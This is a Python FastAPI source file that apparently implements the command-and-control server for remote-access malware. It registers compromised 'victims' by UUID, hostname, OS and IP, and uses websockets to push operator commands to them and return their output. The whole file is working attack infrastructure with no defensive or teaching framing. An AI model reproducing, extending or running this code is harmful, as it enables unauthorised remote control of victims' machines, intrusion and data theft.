from fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status, websockets
from models.victim import Victim
from data.db import db
from socketManager import manager

server = FastAPI()

@server.get("/", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def ping():
    return None


@server.post("/connect", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def connect(victim:Victim, response: Response):
    if db.victims.find_one({"UUID":victim.UUID}) is None:
        db.victims.insert_one({"UUID":victim.UUID, "name":victim.name, "OS":victim.OS, "IP":victim.IP})
        response.status_code = status.HTTP_201_CREATED
    return None

sockets = manager.socketManager()

@server.websocket("/ws/{type}/{id}/")
async def sendCommand(type:str,id:str, socket:WebSocket):
    await socket.accept()
    if type == "server":
        sockets.connectServer(id, socket)
    else:
        sockets.connectVictim(id, socket)

    try:
        while True:
            data = await socket.receive_json()
            if data["type"] == "server":
                await sockets.sendCommand(data["id"], data["command"])
            else:
                    await sockets.recieveOutput(data["id"], data["output"])
    except WebSocketDisconnect:
        if type == "server":
            sockets.disconnectServer(id)
        else:
            sockets.disconnectVictim(id)